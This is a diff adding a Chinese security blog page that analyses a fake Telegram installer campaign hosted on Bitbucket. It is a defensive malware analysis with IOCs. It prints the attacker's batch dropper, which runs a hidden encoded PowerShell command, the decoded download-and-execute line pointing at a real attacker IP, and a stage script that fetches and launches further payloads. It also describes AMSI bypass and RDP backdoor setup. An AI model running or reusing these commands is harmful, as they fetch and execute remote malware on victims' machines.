@@ -1,0 +1,1165 @@
+
+<!doctype html>
+<html class="theme-next use-motion theme-next-mala">
+<head><meta name="generator" content="Hexo 3.9.0">
+  
+
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5">
+
+
+
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.5.1">
+
+
+    <meta name="description" content="kali|linux|sec|Web|MSF|Win">
+
+
+
+  <meta name="keywords" content="windows,">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Demonsec" type="application/atom+xml">
+
+
+
+  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.1">
+
+
+<meta name="keywords" content="windows">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Telegram恶意广告活动之恶意仓库分析">
+<meta property="og:url" content="www.ggsec.cn/Telegram恶意广告活动之恶意仓库分析.html">
+<meta property="og:site_name" content="Demonsec">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-24.jpg">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-1.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-2.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-3.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-4.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-5.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-6.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-7.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-8.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-9.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-10.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-11.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-12.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-13.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-14.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-15.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-16.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-17.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-18.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-19.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-20.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-21.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-22.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-23.png">
+<meta property="og:updated_time" content="2021-03-19T11:43:18.479Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Telegram恶意广告活动之恶意仓库分析">
+<meta name="twitter:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-24.jpg">
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: 'Mala',
+    sidebar: 'post'
+  };
+</script>
+
+  <title> Telegram恶意广告活动之恶意仓库分析 | Demonsec </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  <!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+  
+
+
+
+  <div class="container one-column page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><h1 class="site-meta">
+  <span class="logo-line-before"><i></i></span>
+  <a href="/" class="brand" rel="start">
+      <span class="logo">
+        <i class="icon-next-logo"></i>
+      </span>
+      <span class="site-title">Demonsec’S blog</span>
+  </a>
+  <span class="logo-line-after"><i></i></span>
+</h1>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu ">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            <i class="menu-item-icon icon-next-home"></i> <br>
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            <i class="menu-item-icon icon-next-archives"></i> <br>
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            <i class="menu-item-icon icon-next-tags"></i> <br>
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-linux">
+          <a href="/categories/linux" rel="section">
+            <i class="menu-item-icon icon-next-linux"></i> <br>
+            linux
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-windows">
+          <a href="/categories/windows" rel="section">
+            <i class="menu-item-icon icon-next-windows"></i> <br>
+            windows
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-haking">
+          <a href="/categories/haking" rel="section">
+            <i class="menu-item-icon icon-next-haking"></i> <br>
+            haking
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-web">
+          <a href="/categories/web" rel="section">
+            <i class="menu-item-icon icon-next-web"></i> <br>
+            web
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-msf">
+          <a href="/categories/Metasploit" rel="section">
+            <i class="menu-item-icon icon-next-msf"></i> <br>
+            Metasploit
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-kali">
+          <a href="/categories/kali" rel="section">
+            <i class="menu-item-icon icon-next-kali"></i> <br>
+            kali
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tea">
+          <a href="/categories/tea" rel="section">
+            <i class="menu-item-icon icon-next-tea"></i> <br>
+            tea
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-黑苹果">
+          <a href="/categories/mac" rel="section">
+            <i class="menu-item-icon icon-next-黑苹果"></i> <br>
+            mac
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-逆向">
+          <a href="/categories/逆向" rel="section">
+            <i class="menu-item-icon icon-next-逆向"></i> <br>
+            逆向
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-music">
+          <a href="/music" rel="section">
+            <i class="menu-item-icon icon-next-music"></i> <br>
+            music
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-每日安全干货及动态">
+          <a href="/categories/每日安全干货及动态" rel="section">
+            <i class="menu-item-icon icon-next-每日安全干货及动态"></i> <br>
+            每日安全干货及动态
+          </a>
+        </li>
+      
+
+      
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    
+      
+
+      
+        <style type="text/css">
+
+    .circle {
+        width: 40px;
+        height: 40px;
+        background: #555 no-repeat;
+        cursor: move;
+    }
+
+    .assist-btn {
+        position: fixed;
+        top: 50％;
+        left: 10px;
+        -moz-border-radius: 50px;
+        -webkit-border-radius: 50px;
+        border-radius: 50px;
+        outline: none;
+        border: none;
+        color: #87daff;
+    }
+
+</style>
+
+<script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+<script type="text/javascript">
+    // 浮动圆点展开与收缩
+    /*
+    $(function () {
+        var assist_box = $('.assist-box');
+        $('#assist_btn').hover(function () {
+            assist_box.stop().show(300);
+        }, function () {
+            assist_box.stop().hide(150);
+        })
+    });
+    */  
+    //浮动圆点拖动
+    $(function () {
+        var box = document.getElementById('assist_btn');
+        box.onmousedown = function (event) {
+            var e = event || window.event,
+                t = e.target || e.srcElement,
+                // 鼠标按下时的坐标x1,y1
+                x1 = e.clientX,
+                y1 = e.clientY,
+                //鼠标按下时的左右偏移量
+                dragLeft = this.offsetLeft,
+                dragTop = this.offsetTop;
+
+            document.onmousemove = function (event) {
+                var e = event || window.event,
+                    t = e.target || e.srcElement,
+                    // 鼠标移动时的动态坐标
+                    x2 = e.clientX,
+                    y2 = e.clientY,
+                    // 鼠标移动时的坐标的变化量
+                    x = x2 - x1,
+                    y = y2 - y1;
+                box.style.left = (dragLeft + x) + 'px';
+                box.style.top = (dragTop + y) + 'px';
+            }
+
+            document.onmouseup = function () {
+                this.onmousemove = null;
+            }
+        }
+    });
+
+/*
+    $whitesmoke   = #f5f5f5
+    $gainsboro    = #eee
+    $gray-lighter = #ddd
+    $grey-light   = #ccc
+    $grey         = #bbb
+    $grey-dark    = #999
+    $grey-dim     = #666
+    $black-light  = #555
+    $black-deep   = #222
+    $red          = #ff2a2a
+    $blue-bright  = #87daff
+    $blue         = #0684bd
+    $blue-deep    = #262a30
+*/
+    // white theme
+    var body = {color: "#555", background: "white"};
+    var a_tag = {color: "#222"};
+    var header = { background: "#f5f5f5"};
+    var logo_line_i = {background: "#222"};
+    // var post_code = {background: "#eee", color: "#222"};
+
+    function switch_theme() {
+        $("body").css(body);
+        $("a:not('.links-of-author-item a, .site-state-item a, .site-state-posts a, .feed-link a, .motion-element a, .post-tags a, .show-commit-cls a, #donate_board a')").css(a_tag);
+        $(".header, .footer").css(header);
+        $(".logo-line-before i, .logo-line-after i").css(logo_line_i);
+        //$(".post code").css(post_code);
+        $("#idhyt-surprise-ball #idhyt-surprise-ball-animation .drag").css(a_tag);
+        $(".post-title-link, .posts-expand .post-meta, .post-comments-count, .disqus-comment-count, .post-category a, .post-nav-next a, .post-nav-item a").css(a_tag);
+        
+        // $("code").css({color: '#c5c8c6', background: '#1d1f21'});
+        $("#assist_btn").hide(1500);
+    }
+
+    $(function () {
+        $("#assist_btn").dblclick(function() {
+            switch_theme();
+        });
+    });
+
+</script>
+
+<div>
+
+    <button class="assist-btn circle" id="assist_btn" title="双击切换">
+        亮
+    </button>
+
+</div>
+
+
+
+
+
+
+
+
+
+      
+
+    
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content"> 
+
+  <div id="posts" class="posts-expand">
+    
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
+              Telegram恶意广告活动之恶意仓库分析
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          发表于
+          <time itemprop="dateCreated" datetime="2021-03-19T18:34:14+08:00" content="2021-03-19">
+            2021-03-19
+          </time>
+        </span>
+
+        
+          <span class="post-category">
+            &nbsp; | &nbsp; 分类于
+            
+              <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                <a href="/categories/windows/" itemprop="url" rel="index">
+                  <span itemprop="name">windows</span>
+                </a>
+              </span>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <!--
+              <a href="/Telegram恶意广告活动之恶意仓库分析.html#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="Telegram恶意广告活动之恶意仓库分析.html" itemprop="commentsCount"></span>
+              </a>
+              -->
+              <a href="/Telegram恶意广告活动之恶意仓库分析.html#comments" itemprop="discussionUrl">
+                <span>评论</span>
+              </a>
+            </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <span itemprop="articleBody"><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-24.jpg" alt="1"><br><a id="more"></a></p>
+<h3 id="1-起源"><a href="#1-起源" class="headerlink" title="1.起源"></a>1.起源</h3><p>Jeremy Kirk博主表示在搜索telegram的时候发现有一个有趣的广告</p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-1.png" alt="1"></p>
+<p>访问链接后，看起来像是telegram的官方网站，做的很逼真，但是其实就是钓鱼网站，当我们查看链接时，我们发现它用恶意软件替换了Windows二进制文件：</p>
+<p>指向第三方的链接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/downloads/TelegramInstaller.exe</span><br></pre></td></tr></table></figure>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-2.png" alt="2"></p>
+<p>查看证书，我们可以看到它们是由相同的CA在相同的时间范围内颁发的，这很可能使它们来自同一威胁参与者。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://telegramdesktop.com/</span><br><span class="line">https://telegramdesktop.net/</span><br><span class="line">https://telegramdesktop.org/</span><br></pre></td></tr></table></figure>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-3.png" alt="33"></p>
+<p>当然在博主发完博文的后，我再次查看该网站，发现了它对链接也进行了替换。</p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-4.png" alt="4"></p>
+<h3 id="2-bitbucker发现"><a href="#2-bitbucker发现" class="headerlink" title="2.bitbucker发现"></a>2.bitbucker发现</h3><p>在.com网站将其文件分发到bitbucker仓库中（github替代品）。访问仓库时，我们可以收集有关感染，操作日期以及其他恶意软件样本的一些信息：</p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-5.png" alt="5"></p>
+<p>在该仓库发现如下内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/get/31a6a41f7711.zip</span><br><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/downloads/TelegramInstaller.exe</span><br><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/downloads/Crycker.exe</span><br><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/downloads/TelegramInstallerX86.exe</span><br><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/downloads/RuntimeBroker.exe</span><br><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/downloads/rxr.exe</span><br><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/downloads/zxc.exe</span><br><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/downloads/SoftwareUpdate.exe</span><br><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/downloads/Discord_x86_Setup.exe</span><br><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/downloads/TGInstaller.exe</span><br><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/downloads/TGInstaller.scr</span><br><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/downloads/DRX.exe</span><br><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/downloads/SmartScreenUpdater.exe</span><br></pre></td></tr></table></figure>
+<h3 id="3-powershell脚本分析"><a href="#3-powershell脚本分析" class="headerlink" title="3.powershell脚本分析"></a>3.powershell脚本分析</h3><p>同时在该仓库中发现一个提交者的仓库。</p>
+<p><strong>本文就着重讲解在该提交者的仓库中的链接，我们从bat脚本更好的去入手分析</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://bitbucket.org/takax/1/downloads/TGInstaller.rar</span><br><span class="line">https://bitbucket.org/takax/1/downloads/TelegramInstaller.rar</span><br><span class="line">https://bitbucket.org/takax/1/downloads/RDP.exe</span><br><span class="line">https://bitbucket.org/takax/1/downloads/TelegramInstaller.exe</span><br><span class="line">https://bitbucket.org/takax/1/downloads/clr.exe</span><br><span class="line">https://bitbucket.org/takax/1/downloads/12.bat</span><br></pre></td></tr></table></figure>
+<h4 id="3-1-bat"><a href="#3-1-bat" class="headerlink" title="3.1 bat"></a>3.1 bat</h4><p>运行bat后，下载执行powershel脚本。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 &amp;&amp; start &quot;&quot; /min &quot;%~dpnx0&quot; %* &amp;&amp; exit</span><br><span class="line">powershell -w hidden -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AOQA0AC4AMQA1ADgALgAyADQANQAuADgAOAAvAG0AYQBlAC4AcABzADEAJwApAA==</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
+<p>base64 解码后为以下内容，执行下载mae。ps1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX (New-Object Net.Webclient).downloadstring(&apos;http://94.158.245.88/mae.ps1&apos;)</span><br></pre></td></tr></table></figure>
+<h4 id="3-2-mae-ps1"><a href="#3-2-mae-ps1" class="headerlink" title="3.2 mae.ps1"></a>3.2 mae.ps1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(New-Object Net.Webclient).downloadstring(&quot;http://94.158.245.88/mae/start.vbs&quot;) | out-file $env:temp\start.vbs</span><br><span class="line">(New-Object Net.Webclient).downloadstring(&quot;http://94.158.245.88/mae/Get-Content.ps1&quot;) | out-file $env:temp\Get-Content.ps1</span><br><span class="line">(New-Object Net.Webclient).downloadstring(&quot;http://94.158.245.88/mae/ready.ps1&quot;) | out-file $env:temp\ready.ps1</span><br><span class="line"></span><br><span class="line">start-process wscript -args &quot;$env:temp\start.vbs&quot;</span><br></pre></td></tr></table></figure>
+<p>下载2个powerrshell脚本和1个vbs脚本。运行vbs脚本。最终三个脚本都是为了执行Get-Content.ps1</p>
+<h4 id="3-3-start-vbs"><a href="#3-3-start-vbs" class="headerlink" title="3.3  start.vbs"></a>3.3  start.vbs</h4><p>通过WMI查看SMBiosData，反VM技术。如果成功，执行ready.ps1文件</p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-6.png" alt="6"></p>
+<h4 id="3-4-ready-ps1"><a href="#3-4-ready-ps1" class="headerlink" title="3.4 ready.ps1"></a>3.4 ready.ps1</h4><p>大体就是使用bypass amsi 去执行Get-Conten。ps1</p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-7.png" alt="7"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set-alias invokecommand expandstring invoke-expression AmsiScanBufferamsi.dll@¸W</span><br></pre></td></tr></table></figure>
+<p>综上所述这四个文件都是为了Get-Conten。ps1这一个脚本而去服务的</p>
+<p>下面我们来重点分析这个脚本。</p>
+<h4 id="3-5-Get-Conten-ps1"><a href="#3-5-Get-Conten-ps1" class="headerlink" title="3.5 Get-Conten.ps1"></a>3.5 Get-Conten.ps1</h4><p>前面部分和ready。ps1相似，也是用来<strong>bypass  asmi</strong>的</p>
+<p>但是<strong>func svcngnxjld 函数</strong> 是不同的，目的就是为了将其变量 <strong>$sotcschdvz</strong>的<strong>base64 payload</strong> 在变量 <strong>$swzsujyskx</strong>   <strong>三层字符串解密输出</strong>，  并 调用invoke-expression 进行执行</p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-8.png" alt="8"></p>
+<p>我们去掉最后一行 invoke-expression 字符串，让其输出<strong>$swzsujyskx </strong>  变量解密后的内容，还原被加密之前的内容</p>
+<p>内容大体如下图所示</p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-9.png" alt="9"></p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-10.png" alt="10"></p>
+<p>那么当我们去解码<strong>$reg base64</strong>时，发现该代码为乱码。</p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-11.png" alt="11"></p>
+<p>那么我们发现<strong>$reg命名为 $giruhabg</strong> ，然后被<strong>func gogeoha31函数调用</strong></p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-12.png" alt="12"></p>
+<p>那么我们可以看到<strong>func gogeoha31函数</strong> ，$low变量引起我们的注意，这个变是解密的关键。</p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-13.png" alt="13"></p>
+<p>我们继续追踪到<strong>func pasgouta函数调用</strong> ,可以看到 其功能为xor解密，而key 为  <strong>“urueusj”</strong> </p>
+<p>我们可以找到网上开源的powershell 脚本进行 xor加密与解密 </p>
+<p><a href="https://gist.github.com/gabemarshall/f25afd533b341e1b21bc39f8e26946b7" target="_blank" rel="noopener">https://gist.github.com/gabemarshall/f25afd533b341e1b21bc39f8e26946b7</a></p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-14.png" alt="14"></p>
+<p>那么我们可以在CyberChef中加入xor的模块放入key，以及它还进行了 base64加密和gzip的压缩,然后再次使用base64加密，那么我们依次加入的模块为如下图所示，只需替换base64即可。</p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-15.png" alt="15"></p>
+<p>那么我们依次对下图所示的几个变量进行解码，即可得到相对应的文件。</p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-16.png" alt="16"></p>
+<p>将这些base64解密等处理后的文件为如下所示</p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-17.png" alt="17"></p>
+<p><strong>1.rdpclip.exe</strong> </p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-18.png" alt="18"></p>
+<p><strong>2.rdpwap.ini</strong> 目的就是开启rdp进行远控</p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-19.png" alt="19"></p>
+<p><strong>3.rfxvmt.dll</strong> </p>
+<p>rdpclip.exe对于RDP会话中的文件复制和粘贴是必需的，而rfxvmt.dll对于Microsoft RemoteFX VM Transport是必需的，它为RDP添加了附加功能，例如访问物理图形处理单元（GPU）硬件加速</p>
+<p>在计算机上搜索这两个文件，如果找不到，则恶意软件会将它们写入系统。此外，该恶意软件还会进行以下权限更改：</p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-20.png" alt="20"></p>
+<p>这些权限更改对于两个删除的DLL文件正常运行是必需的。</p>
+<p>这以上三个文件<strong>与已知19年的APT组织TA505—–Hive0065</strong>   使用的方法相似</p>
+<p><strong>4.reg</strong>注册表</p>
+<p><strong>依旧可以看到 reg注册表、rdp.ini配置文件、DLL文件 均与这个 开源的rdpwrap项目相关</strong> </p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-21.png" alt="21"></p>
+<p><strong>5.mediasvc.png与mediasrv.png</strong></p>
+<p>这两个则为后门通信程序</p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-22.png" alt="22"></p>
+<h4 id="4-部署"><a href="#4-部署" class="headerlink" title="4.部署"></a>4.部署</h4><p>而get-conten文件最后呢 对系统进行了一些配置修改</p>
+<p><strong>1.修改远程端口7201,加载后门服务，开启远程，添加服务器</strong></p>
+<p><strong>2.获得域管理员权限.</strong></p>
+<p><strong>3.修改时间戳</strong></p>
+<p><strong>4.添加rdp和终端服务</strong></p>
+<p><strong>5.清理痕迹</strong></p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-23.png" alt="23"></p>
+<h3 id="4-IOC"><a href="#4-IOC" class="headerlink" title="4.IOC"></a>4.IOC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"> Main object - 12.bat </span><br><span class="line">    SHA256 77895769097f983c4137bbea5b87a685f2252994e3761ede65081e45d496177c </span><br><span class="line">    SHA1 8b9daf70dfbd04ecf3f98ef874392231d2ce1c70</span><br><span class="line">    MD5 ca9cc08a6f67e22bff228f7b862ba30e </span><br><span class="line"></span><br><span class="line">    mae.ps1 </span><br><span class="line">    SHA256 42C277ADA9C6F8DDCD6211E4792A8DF1FA0D0AD8CBB867EEE1A431CC1B79834D </span><br><span class="line">    SHA1 348909394CA5D1E605ECB20CFA95A1870F529669 </span><br><span class="line">    MD5 DBD0A5FB31FDF76CF0D7DFA2E67ADEB7 </span><br><span class="line"></span><br><span class="line">    start.vbs</span><br><span class="line">    SHA256 5D4A0661CFB3CCA59ACD8A9FA433EC2C48D686DA36F3890B73E7B9F37C60E980 </span><br><span class="line">    SHA1 57CED4325A4F1C93D6928E560E5C7209A4ED0282 </span><br><span class="line">    MD5 9E3905E054E78547EC4FBBBB73E92B78</span><br><span class="line"></span><br><span class="line">    ready.ps1</span><br><span class="line">    SHA256 586850ea99ba4844c0dde20b7260c4222c67e0ede021c5e1c1339e664b1ce191 </span><br><span class="line">    SHA1 17c7dd1b1e72c3fcdef91e9206f58406a98564e7 </span><br><span class="line">    MD5 18e76ebd0f8694e0f998443e5763ea8d</span><br><span class="line"></span><br><span class="line">    Get-Content.ps1</span><br><span class="line">    SHA256 E9E217E32B0F5963FD40CAFB1CE800907B7B06F8A0E960B62BFA41D37841DEAB </span><br><span class="line">    SHA1 B8C54D44DE03CFF2467FB504CD972D677C32AB25 </span><br><span class="line">    MD5 DED160C4F2409D48DA8FEAF0934D3F02</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Get-Content.ps1(malware-and-artifacts)</span><br><span class="line"></span><br><span class="line">MD5 (Rdpclip.exe) = 1690e3004f712c75a2c9ff6bcde49461</span><br><span class="line">MD5 (dgiusjeja64_mediasrv.png) = c13860727871a39063e0bb58117919ba</span><br><span class="line">MD5 (otiiahj64_mediasvc.png) = aa6bf98c9120b0539c0270a3e453ddf6</span><br><span class="line">MD5 (reg.reg) = 5a2f4e19ffc05366279f9341913722f1</span><br><span class="line">MD5 (rfxvmt.dll) = dc39d23e4c0e681fad7a3e1342a2843c</span><br><span class="line">MD5 (wupsvc.jpg_rdpwap.ini) = dc5b36b03764114c55cec484d975888a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Connections  </span><br><span class="line"> IP 94.158.245.88 </span><br><span class="line"> IP 5.181.156.3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/HTTPS requests  </span><br><span class="line"> URL http://94.158.245.88/mae/start.vbs </span><br><span class="line"> URL http://94.158.245.88/mae/Get-Content.ps1 </span><br><span class="line"> URL http://94.158.245.88/mae/ready.ps1</span><br></pre></td></tr></table></figure>
+<h3 id="链接："><a href="#链接：" class="headerlink" title="链接："></a>链接：</h3><p><a href="https://github.com/stascorp/rdpwrap" target="_blank" rel="noopener">https://github.com/stascorp/rdpwrap</a></p>
+<p><a href="https://suid.ch/research/Telegram_Malware_Analysis.html" target="_blank" rel="noopener">https://suid.ch/research/Telegram_Malware_Analysis.html</a></p>
